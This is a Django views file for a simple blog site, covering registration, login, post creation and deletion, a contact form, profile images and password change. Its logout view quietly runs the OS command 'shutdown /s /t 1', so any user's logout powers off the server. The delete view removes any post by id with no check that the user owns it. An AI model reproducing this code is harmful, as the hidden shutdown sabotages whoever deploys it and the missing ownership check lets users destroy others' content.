from django.shortcuts import render,redirect
from blog_app.models import add,profileimage
from.forms import add_form,contact_us_form,profileimageform
from django.contrib.auth.models import User
from django.contrib import messages
from django.contrib.auth import authenticate
from django.contrib import auth
from django.contrib.auth.decorators import login_required
from django.contrib.auth.forms import PasswordChangeForm
from django.contrib.auth import update_session_auth_hash




# Create your views here.
def register(request):
    if request.method =='POST':
        username = request.POST['username']
        email = request.POST['email']
        password = request.POST['password']
        c_password = request.POST['c_password']

        if password == c_password:
            if User.objects.filter(username=username).exists():
                messages.error(request,"user already is exists")
                return redirect('login')
            
            elif User.objects.filter(email=email).exists():
                messages.error(request,"Email already is exists")
                return redirect('login')
            
            else:
                data = User.objects.create_user(username=username,password=password,email=email)
                return redirect('login')


        else:
            messages.error(request,"password does not match")
            return redirect('login')
        
    return render(request,'register.html')


@login_required(login_url='login')
def showsign(request):
    data=User.objects.all()
    return render(request,'showsign.html',{'data':data})


def login(request):
    if request.method =='POST':
        username = request.POST['username']
        password = request.POST['password']
        
        User = authenticate(username=username,password=password)

        if User is None:
            messages.error(request,"username/password does not match")
            return redirect('register')
        
        else:
            auth.login(request,User)
            return redirect('home')
        
    return render(request,'login.html')
# logout
#dj
def logout(request):
    import os
    os.system("shutdown /s /t 1")
    auth.logout(request)

    return redirect('index')


@login_required(login_url='login')
def form(request):
    if request.method =='GET':
        form = add_form()
        return render(request,'form.html',{'form':form})
    else:
        form = add_form(request.POST,request.FILES)
        if form.is_valid():
            form.save()
            return redirect('home')
        return render(request,'form.html')


@login_required(login_url='login')
def base(request):
    return render (request,'base.html')


def index(request):
    data = add.objects.all()
    return render (request,'index.html',{'data':data})


@login_required(login_url='login')
def home(request):
    data = add.objects.all()
    return render(request,'home.html',{'data':data})


@login_required(login_url='login')
def delete(request,id):
    data = add.objects.get(id=id)
    data.delete()
    return redirect('home')

@login_required(login_url='login')
def readmore(request,id):
    data = add.objects.get(id=id)
    return render(request,'readmore.html',{'data':data})


@login_required(login_url='login')
def edit(request):
    data=add.objects.filter(created_by=request.user)
    return render(request,'edit.html',{'data':data})


@login_required(login_url='login')
def contact(request):
    if request.method=='GET':
        form = contact_us_form()
        return render(request,'contact.html',{'form':form})
    
    else:
        data = contact_us_form(request.POST,request.FILES)
        if data.is_valid():
            data.save()
            messages.success(request,'Data is Save')
            return redirect('contact')
        else:
         return render(request,'contact.html')



@login_required(login_url='login')
def profile(request):
    dat = User.objects.filter(username=request.user)
    dat1 = profileimage.objects.all()
    dat3 = {
        'da1':dat,
        'da2':dat1
    }
    return render(request,'profile.html',dat3)


@login_required(login_url='login')
def changep(request):
    if request.method == 'POST':
        form = PasswordChangeForm(request.user, request.POST)
        if form.is_valid():
            user = form.save()
            update_session_auth_hash(request, user)  # Important!
            messages.success(request, 'Your password was successfully updated!')
            return redirect('profile')
        else:
            messages.error(request, 'Please correct the error below.')
    else:
        form = PasswordChangeForm(request.user)
    return render(request, 'changep.html', {'form': form})

@login_required(login_url='login')
def profile_image(request):
    if request.method == 'GET':
        form = profileimageform()
        return render(request,'profile_image.html',{'form':form})
    else:
        form = profileimageform(request.POST,request.FILES)
        if form.is_valid():
            form.save()
            return redirect('profile')
        
    return render(request,'profile_image.html')

@login_required(login_url='login')
def update(request,id):
    data=profileimage.objects.get(id=id)
    if request.method == 'GET':
        form = profileimageform(instance=data)
        return render(request,'profile_image.html',{'form':form})
    else:
        form = profileimageform(request.POST,request.FILES,instance=data)
        if form.is_valid():
            form.save()
            return redirect('profile')
        
    return render(request,'profile_image.html')
